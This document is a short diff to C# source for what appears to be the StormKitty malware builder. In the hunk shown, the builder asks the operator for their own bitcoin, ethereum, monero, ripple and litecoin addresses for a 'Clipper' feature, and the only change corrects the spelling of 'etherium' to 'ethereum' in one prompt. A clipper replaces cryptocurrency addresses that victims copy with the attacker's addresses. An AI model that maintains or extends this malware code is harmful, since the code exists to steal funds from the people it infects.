@@ -38,7 +38,7 @@ namespace StormKittyBuilder
             if (build.ConfigValues["Clipper"].Equals("1"))
             {
                 build.ConfigValues["ClipperBTC"] = cli.GetEncryptedString("Clipper : Your bitcoin address");
-                build.ConfigValues["ClipperETH"] = cli.GetEncryptedString("Clipper : Your etherium address");
+                build.ConfigValues["ClipperETH"] = cli.GetEncryptedString("Clipper : Your ethereum address");
                 build.ConfigValues["ClipperXMR"] = cli.GetEncryptedString("Clipper : Your monero address");
                 build.ConfigValues["ClipperXRP"] = cli.GetEncryptedString("Clipper : Your ripple address");
                 build.ConfigValues["ClipperLTC"] = cli.GetEncryptedString("Clipper : Your litecoin address");
